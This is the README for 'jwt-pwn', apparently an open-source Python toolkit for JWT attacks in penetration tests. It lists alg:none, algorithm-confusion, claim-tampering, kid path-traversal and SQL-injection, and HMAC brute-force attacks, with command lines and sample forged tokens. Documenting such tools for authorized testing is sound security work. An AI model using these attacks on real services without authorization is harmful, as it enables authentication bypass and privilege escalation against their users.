# jwt-pwn

A zero-dependency Python 3 toolkit for discovering and exploiting JWT vulnerabilities during web application penetration tests.

> **For authorized security testing only.** Only use against systems you own or have explicit written authorization to test.

## Attacks Implemented

| Attack | CVE Class | Description |
|--------|-----------|-------------|
| `alg:none` | Signature bypass | Strips signature, sets `alg` to `none`/`None`/`NONE`/`nOnE` |
| RS256→HS256 confusion | Algorithm confusion | Signs with HS256 using RSA public key as HMAC secret |
| Claim tampering | Privilege escalation | Modifies `role`, `admin`, `exp`, `sub`, `iss` etc. |
| `kid` path traversal | Key confusion | Sets `kid` to `/dev/null` → empty HMAC secret |
| `kid` SQL injection | SQLI in header | Injects SQL payload into `kid` field |
| HMAC brute-force | Weak secret | Wordlist attack against HS256/384/512 secrets |

## Usage

```bash
# Decode and inspect any JWT
python jwt_pwn.py --decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# alg:none attack — generates 4 variants
python jwt_pwn.py --token eyJ... --alg-none

# RS256 → HS256 confusion (supply the server's RSA public key)
python jwt_pwn.py --token eyJ... --rs256-hs256 server_pubkey.pem

# Tamper claims and re-sign (known secret)
python jwt_pwn.py --token eyJ... --tamper '{"role":"admin","exp":"+9999d"}' --secret weakpassword

# kid path traversal → sign with empty key
python jwt_pwn.py --token eyJ... --kid path_traversal

# kid SQL injection
python jwt_pwn.py --token eyJ... --kid sql_injection

# Brute-force HMAC secret
python jwt_pwn.py --token eyJ... --brute /usr/share/wordlists/rockyou.txt

# JSON output for toolchain integration
python jwt_pwn.py --token eyJ... --alg-none --json
```

## Example: alg:none

```
[+] alg:none
    alg_value: none
    token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.

[+] alg:none
    alg_value: None
    token: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
```

## Example: Decoded JWT

```
── Header ──────────────────────────────
{
  "alg": "HS256",
  "typ": "JWT"
}
── Payload ─────────────────────────────
{
  "sub": "1234567890",
  "role": "user",
  "exp": 1716000000
}
  ⚠ EXPIRED 86400s ago
── Signature (32 bytes) ─────────────
8a7f...
```

## Requirements

Python 3.9+ — no external dependencies.

## References

- [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519: JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [CVE-2015-9235: alg:none in multiple JWT libraries](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)

## License

MIT License — Copyright (c) 2026 Yanis Ameseder

---

**Bitcoin donations:** `39vZWmnUwDReQ15BwqQXzyqVQ6U8LardEf`
